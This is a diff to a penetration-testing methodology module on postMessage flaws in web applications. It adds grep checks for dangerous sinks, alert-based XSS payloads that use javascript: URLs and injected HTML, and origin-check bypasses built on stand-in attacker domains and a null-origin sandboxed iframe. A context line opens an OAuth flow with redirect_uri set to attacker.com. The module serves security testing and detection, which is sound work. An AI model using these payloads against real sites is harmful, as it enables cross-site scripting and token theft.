@@ -1,6 +1,6 @@
 # VULN MODULE — postMessage / Cross-Frame Messaging
 # Asset: webapp (web applications using iframe communication)
-# See also: asset/chromeext/vuln/postmessage.md for extension-specific variant
+# See also: asset/browserext/vuln/postmessage.md for extension-specific variant
 # Report ID prefix: WEB-PM
 
 ## THREAT MODEL
@@ -42,7 +42,13 @@ grep -rn "event\.origin\|message\.origin" --include="*.js" --include="*.ts"
 
 # Dangerous sinks fed by message data
 grep -rn "event\.data\b" --include="*.js" --include="*.ts" -A3
-# Check: does event.data flow into innerHTML, eval, location.href, fetch()?
+# Check: does event.data flow into:
+#   innerHTML, outerHTML, insertAdjacentHTML, document.write  → Stored/DOM XSS
+#   eval(), new Function(), setTimeout(str), setInterval(str) → JS injection
+#   location.href, location.assign(), location.replace()      → open redirect / XSS via javascript: URL
+#   fetch(), XMLHttpRequest, axios                            → SSRF / request forgery
+grep -rn "location\.href\s*=\s*\|location\.assign(\|location\.replace(" --include="*.js" --include="*.ts"
+# If any of these receive event.data values → javascript: URL XSS candidate
 
 # postMessage sends with wildcard origin (data leakage)
 grep -rn "postMessage.*['\"][*]['\"]" --include="*.js" --include="*.ts"
@@ -136,6 +142,19 @@ frame.contentWindow.postMessage({
   template: '<img src=x onerror="alert(document.domain)">',
   html: '<script>alert(document.domain)<\/script>'
 }, '*');
+
+// If event.data feeds into location.href / location.assign / location.replace:
+// The javascript: protocol causes JS execution in the target frame's context
+frame.contentWindow.postMessage({
+  redirect_url: 'javascript:alert(document.domain)',
+  return_url:   'javascript:alert(document.domain)',
+  url:          'javascript:alert(document.domain)',
+  next:         'javascript:alert(document.domain)'
+}, '*');
+
+// Also try:
+frame.contentWindow.postMessage('{"action":"navigate","url":"javascript:alert(document.domain)"}', '*');
+// String-serialized payloads are common in older codebases that use JSON.parse(event.data)
 ```
 
 ### Step 5 — OAuth token theft via postMessage
@@ -163,20 +182,87 @@ window.open('https://target.com/auth/start?redirect_uri=https://attacker.com', '
 Even when origin IS checked, these bypasses are worth testing:
 
 ```javascript
-// Bypass 1: startsWith check
+// Bypass 1: startsWith check (no end anchor)
 // Vulnerable: if (event.origin.startsWith('https://trusted.com'))
-// Bypass: use https://trusted.com.attacker.com
+// Bypass: https://trusted.com.attacker.com
+//         https://trusted.com@attacker.com
+// The check passes because the string starts with 'https://trusted.com'
 
 // Bypass 2: includes check
 // Vulnerable: if (event.origin.includes('trusted.com'))
-// Bypass: use https://attacker.com?x=trusted.com or https://trusted.com.evil.com
+// Bypass: https://attacker.com?x=trusted.com
+//         https://trusted.com.evil.com
+//         https://notrusted.com  ← 'trusted.com' appears literally in domain
 
 // Bypass 3: null origin (sandboxed iframe)
-// Some handlers accept null origin:
+// Some handlers allowlist null:
 // if (event.origin === null || event.origin === 'https://trusted.com')
-// Bypass: send from sandboxed iframe: <iframe sandbox="allow-scripts" srcdoc="...">
+// Bypass: send from a sandboxed iframe — its origin reports as "null"
+// <iframe sandbox="allow-scripts" srcdoc="<script>parent.postMessage('payload','*')<\/script>"></iframe>
 
-// Bypass 4: regex without anchors
+// Bypass 4: regex with ^ anchor but no $ end anchor
+// Vulnerable: if (/^https:\/\/payments\.example\.com/.test(event.origin))
+// Bypass: https://payments.example.com.attacker.io
+//         The regex matches the prefix — the suffix is unchecked
+// Detection: grep for regex patterns without trailing $ or \b after the domain
+
+// Bypass 5: fully unanchored regex
 // Vulnerable: if (/trusted\.com/.test(event.origin))
-// Bypass: https://attacker.com?trusted.com
+// Bypass: https://attacker.com/trusted.com  (path contains the string)
+//         https://attacker.com?trusted.com  (query string contains it)
+
+// Bypass 6: protocol check only
+// Vulnerable: if (event.origin.startsWith('https://'))
+// Bypass: any https:// origin — completely useless check
+// Common in quick fixes that only guard against http://
+```
+
+### Grep — detect weak regex patterns in code
+```bash
+# Find regex origin checks that may lack end anchor ($)
+grep -rn "\.test(event\.origin)\|\.test(message\.origin)" --include="*.js" --include="*.ts"
+# For each hit: read the regex — does it end with \b, $, or a port :NNN)?
+# If it ends with the domain name followed by / → likely bypassable with domain.attacker.com
+
+# Find startsWith / includes checks
+grep -rn "event\.origin\.startsWith\|event\.origin\.includes\|event\.origin\.indexOf" \
+  --include="*.js" --include="*.ts"
+```
+
+---
+
+## TOOLS
+
+### Blackbox — dynamic interception and monitoring
+
+| Tool | Purpose | How to use |
+|------|---------|-----------|
+| **Burp Suite DOM Invader** | Auto-detects postMessage handlers, injects canary values, traces data to DOM sinks | Enable in Burp browser → visit target → check DOM Invader tab for postMessage events |
+| **PostMessage-Tracker** (Chrome extension) | Logs every `postMessage` sent/received with origin, data, and source frame | Install extension → visit target → check extension popup for message log |
+| **Untrusted Types** (Chrome extension) | Tracks data flow from postMessage sources to dangerous DOM sinks (Trusted Types integration) | Install → visit target → violations appear in DevTools console |
+
+### Browser DevTools — breakpoint-based analysis
+
+```
+1. Open DevTools → Sources tab (Chrome) or Debugger (Firefox)
+2. In Chrome: Sources → Event Listener Breakpoints → Message → message
+   (This breaks on every MessageEvent before any handler runs)
+3. Interact with the target app (trigger iframe loads, OAuth flows, etc.)
+4. When breakpoint hits: inspect event.origin, event.data, and call stack
+5. Step through handler code to find where event.data is used
+```
+
+Alternative — xhr/fetch monitoring to catch token exfiltration:
+```javascript
+// Paste in DevTools console on the target page
+const origFetch = window.fetch;
+window.fetch = function(...args) {
+  console.log('[fetch]', args[0], args[1]);
+  return origFetch(...args);
+};
+const origXHR = XMLHttpRequest.prototype.open;
+XMLHttpRequest.prototype.open = function(method, url) {
+  console.log('[XHR]', method, url);
+  return origXHR.apply(this, arguments);
+};
 ```
